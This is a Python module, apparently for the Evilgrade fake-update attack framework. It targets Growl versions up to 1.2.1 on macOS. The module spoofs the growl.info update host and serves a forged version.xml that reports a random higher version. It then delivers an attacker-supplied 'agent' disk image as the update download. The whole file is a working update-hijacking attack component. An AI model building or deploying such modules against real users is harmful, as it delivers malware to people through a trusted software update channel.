from modules import ModuleBase


class Growl(ModuleBase):
    name = 'Growl'
    version = '1.0'
    appver = '<= 1.2.1'
    author = ['Federico Kirschbaum < fedek +[AT]+ infobytesec.com>']
    description = ''
    agent_filename = './agent/osx/update.dmg'
    vh = '(growl.info)' 
    requests = [
        {   'path': 'version.xml',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': 1,
            'file': './include/growl/version.xml',
        },
        {   'path': '.dmg',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]
    options = {
        'version': {
            'val': "'7.' + rand_num(2)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
